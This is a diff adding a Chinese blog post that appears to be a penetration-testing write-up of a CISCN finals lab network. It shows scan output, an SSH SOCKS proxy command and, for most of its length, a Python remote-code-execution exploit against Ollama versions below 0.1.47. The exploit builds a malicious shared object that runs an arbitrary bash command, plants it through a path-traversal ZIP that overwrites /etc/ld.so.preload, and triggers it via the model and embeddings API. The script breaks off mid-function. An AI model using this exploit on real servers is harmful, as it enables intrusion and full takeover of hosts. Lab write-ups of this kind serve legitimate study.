@@ -1,0 +1,655 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link rel="icon" href='https://static.dionysus.zip/static/favicon.ico' type="image/x-icon">
+    <title>Finance - MoonlitSyntax</title>
+
+    <link rel="stylesheet" href='https://static.dionysus.zip/static/css/app-GERNH3ZV.css'>
+
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+
+<body class="l-body">
+
+<nav class="c-nav">
+    <a href="/" class="c-nav__link">首页</a>
+    <a href="/archives" class="c-nav__link">归档</a>
+    <a href="/tags" class="c-nav__link">标签</a>
+    <a href="/categories" class="c-nav__link">分类</a>
+    <a href="/links" class="c-nav__link">友链</a>
+    <a href="/about" class="c-nav__link">关于</a>
+    <button id="search-button" class="c-nav__search-btn">
+        <i class="fas fa-search"></i>
+    </button>
+</nav>
+
+
+<div class="l-container">
+    <div class="l-nav-spacer"></div>
+    <main class="l-main">
+        
+<div class="c-post">
+    <aside class="c-post__toc">
+        <h2 class="c-post__toc-title">目录</h2>
+        
+        <ol class="c-post__toc-list" id="toc-list"></ol>
+        
+    </aside>
+    <div class="c-post__main">
+        <header class="c-post__header">
+            <h1 class="c-post__title">Finance</h1>
+            <div class="c-post__meta">
+                <span class="c-post__meta-create"><i class="fas fa-calendar-plus"></i> 创建：2025-08-09 01:57</span>
+                <span class="c-post__meta-updated"><i class="fas fa-calendar-check"></i> 更新：2025-08-13 22:22</span>
+                <span class="c-post__meta-category"><i class="fas fa-folder-open"></i> 分类：<a href="/categories/%e6%b8%97%e9%80%8f"><strong>渗透</strong></a></span>
+            </div>
+            <div class="c-post__tags">
+                <a href="/tags/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9c" class="c-post__tag">#春秋云镜</a>
+            </div>
+            <div class="c-post__description">
+                CISCN 决赛 渗透
+            </div>
+        </header>
+
+        <article class="c-post__content prose"><blockquote>
+<p>我说白了, 172.22.10.7 和💩有什么区别</p>
+</blockquote>
+<h2 id="外网">外网</h2>
+<p>略, 在 CISCN WP 那篇里有写</p>
+<h2 id="内网">内网</h2>
+<p>扫描网段</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">172.22.10.22
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">172.17.0.1
+</span></span></code></pre></div></div><p>做代理</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">ssh -D 1080 -N -f root@8.145.35.191
+</span></span></code></pre></div></div><h3 id="172.17.0.1">172.17.0.1</h3>
+<p>没有东西</p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">(icmp) Target 172.17.0.1      is alive 本机
+</span></span><span class="line"><span class="cl">(icmp) Target 172.17.0.2      is alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">172.17.0.1:3306 open
+</span></span><span class="line"><span class="cl">172.17.0.1:8081 open
+</span></span><span class="line"><span class="cl">172.17.0.1:80 open
+</span></span><span class="line"><span class="cl">172.17.0.1:22 open
+</span></span><span class="line"><span class="cl">172.17.0.1:8080 open
+</span></span><span class="line"><span class="cl">172.17.0.2:6379 open
+</span></span><span class="line"><span class="cl">172.17.0.1:6379 open
+</span></span></code></pre></div></div><h3 id="172.22.10.22">172.22.10.22</h3>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang is-empty"></div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl">(icmp) Target 172.22.10.22    is alive 本机
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.10.17    is alive ollama
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.10.88    is alive
+</span></span><span class="line"><span class="cl">(icmp) Target 172.22.10.253   is alive
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">172.22.10.88:445 open
+</span></span><span class="line"><span class="cl">172.22.10.88:139 open
+</span></span><span class="line"><span class="cl">172.22.10.88:80 open
+</span></span><span class="line"><span class="cl">172.22.10.17:22 open
+</span></span><span class="line"><span class="cl">172.22.10.88:21 open
+</span></span><span class="line"><span class="cl">172.22.10.88:135 open
+</span></span><span class="line"><span class="cl">
+</span></span></code></pre></div></div><h4 id="ollama">ollama</h4>
+<p><code>{&quot;version&quot;:&quot;0.1.46&quot;}</code></p>
+<div class="c-code"><div class="c-code__header"><div class="c-code__dots"><span class="red"></span><span class="yellow"></span><span class="green"></span></div><div class="c-code__lang">python</div><div class="c-code__actions"><button class="c-code__btn c-code__btn--copy" title="Copy code"><i class="fas fa-copy"></i></button><button class="c-code__btn c-code__btn--fold" title="Fold code"><i class="fas fa-chevron-up"></i></button></div></div><div class="c-code__content" data-lang="python"><pre tabindex="0" class="chroma"><code><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">argparse</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">zipfile</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">urlparse</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Payload template for the malicious shared object</span>
+</span></span><span class="line"><span class="cl"><span class="n">CODE</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;#include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">#include &lt;stdlib.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">#include &lt;unistd.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">void __attribute__((constructor)) myInitFunction() {
+</span></span></span><span class="line"><span class="cl"><span class="s2">    const char *f1 = &#34;/etc/ld.so.preload&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    const char *f2 = &#34;/tmp/hook.so&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="s2">    unlink(f1);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    unlink(f2);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    system(&#34;bash -c &#39;</span><span class="si">%s</span><span class="s2">&#39;&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">}&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">print_status</span><span class="p">(</span><span class="n">message</span><span class="p">,</span> <span class="n">is_error</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Print colored status messages&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">is_error</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[91m[!] </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[94m[+] </span><span class="si">{</span><span class="n">message</span><span class="si">}</span><span class="se">\033</span><span class="s2">[0m&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">format_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Format and validate the URL&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">url</span><span class="o">.</span><span class="n">startswith</span><span class="p">((</span><span class="s1">&#39;http://&#39;</span><span class="p">,</span> <span class="s1">&#39;https://&#39;</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span> <span class="o">+</span> <span class="n">url</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="n">parsed_url</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">parsed_url</span><span class="o">.</span><span class="n">scheme</span><span class="si">}</span><span class="s2">://</span><span class="si">{</span><span class="n">parsed_url</span><span class="o">.</span><span class="n">netloc</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_vulnerability</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Check if the target is vulnerable&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s2">/api/version&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        <span class="n">json_data</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;version&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">json_data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        <span class="c1"># Check if version is less than 0.1.47</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v1</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="n">json_data</span><span class="p">[</span><span class="s2">&#34;version&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">v2</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="s2">&#34;0.1.47&#34;</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">num1</span><span class="p">,</span> <span class="n">num2</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">v1</span><span class="p">,</span> <span class="n">v2</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">num1</span> <span class="o">&lt;</span> <span class="n">num2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">num1</span> <span class="o">&gt;</span> <span class="n">num2</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">len</span><span class="p">(</span><span class="n">v1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">v2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_malicious_so</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Generate malicious shared object file&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="n">CODE</span> <span class="o">%</span> <span class="n">cmd</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;tmp.c&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;gcc&#39;</span><span class="p">,</span> <span class="s1">&#39;tmp.c&#39;</span><span class="p">,</span> <span class="s1">&#39;-o&#39;</span><span class="p">,</span> <span class="s1">&#39;hook.so&#39;</span><span class="p">,</span> <span class="s1">&#39;-fPIC&#39;</span><span class="p">,</span> <span class="s1">&#39;-shared&#39;</span><span class="p">,</span> <span class="s1">&#39;-ldl&#39;</span><span class="p">,</span> <span class="s1">&#39;-D_GNU_SOURCE&#39;</span><span class="p">],</span> 
+</span></span><span class="line"><span class="cl">                      <span class="n">check</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">CalledProcessError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Failed to compile hook.so: </span><span class="si">{</span><span class="n">e</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_malicious_zip</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Create ZIP file with directory traversal for payload delivery&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s1">&#39;evil.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">zipf</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">zipf</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="s1">&#39;../../../../../../../../../../etc/ld.so.preload&#39;</span><span class="p">,</span> <span class="s1">&#39;/tmp/hook.so&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;hook.so&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">so_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">zipf</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="s1">&#39;../../../../../../../../../../tmp/hook.so&#39;</span><span class="p">,</span> <span class="n">so_file</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;all-minilm-22m.gguf&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">model_file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">zipf</span><span class="o">.</span><span class="n">writestr</span><span class="p">(</span><span class="s1">&#39;../../../../../../../../../../tmp/all-minilm-22m.gguf&#39;</span><span class="p">,</span> <span class="n">model_file</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Failed to create ZIP: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">upload_payload</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Upload the payload blob&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;evil.zip&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">file_content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">file_content</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">blob_name</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;sha256:</span><span class="si">{</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s2">/api/blobs/</span><span class="si">{</span><span class="n">blob_name</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">f</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">201</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">print_status</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Warning: Blob upload returned status </span><span class="si">{</span><span class="n">res</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">blob_name</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Failed to upload blob: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_model</span><span class="p">(</span><span class="n">target_url</span><span class="p">,</span> <span class="n">blob_path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Create a model that references the malicious blob&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">json_content</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;test&#34;</span><span class="p">,</span> <span class="s2">&#34;modelfile&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;FROM /root/.ollama/models/blobs/</span><span class="si">{</span><span class="n">blob_path</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s2">/api/create&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">},</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="n">json_content</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Failed to create model: </span><span class="si">{</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="kc">True</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">trigger_execution</span><span class="p">(</span><span class="n">target_url</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Trigger code execution through embeddings API&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">model</span> <span class="o">=</span> <span class="s2">&#34;all-minilm:22m&#34;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">print_status</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Execution attempt </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">/3...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">json_content</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">({</span><span class="s2">&#34;model&#34;</span><span class="p">:</span> <span class="n">model</span><span class="p">,</span> <span class="s2">&#34;keep_alive&#34;</span><span class="p">:</span> <span class="mi">0</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s2">/api/embeddings&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">},</span> 
+</span></span><span class="line"><span class="cl">                <span class="n">data</span><span class="o">=</span><span class="n">json_content</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="n">print_status</span><span class="p">(</span><span class="s2">&#34;Execution successful&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">                
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">        <span class="c1"># Pull the model if it&#39;s not available</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
